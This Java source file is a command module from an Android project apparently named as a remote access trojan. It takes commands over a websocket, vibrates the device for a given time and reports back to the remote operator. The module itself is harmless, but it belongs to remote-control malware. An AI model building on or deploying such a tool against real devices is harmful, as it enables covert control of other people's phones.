package com.je_chen.droidrat_je.command;

import android.content.Context;
import android.util.Log;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.modules.vibrator.VibratorSystem;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class VibratorCommand extends CommandFather{

    private final String TAG = "Vibrator Event ";

    private VibratorSystem vibratorSystem;

    public VibratorCommand(Context context){
        vibratorSystem = new VibratorSystem(context);
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {
                case "Vibrator":
                    int millSec = Integer.parseInt(rawCommandArray[2]);
                    Log.d(TAG,"Vibrator Vibrator:" + millSec);
                    vibratorSystem.startVibrator(millSec);
                    this.send("Vibrator:Vibrator:" + "->" + millSec);
                    break;
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
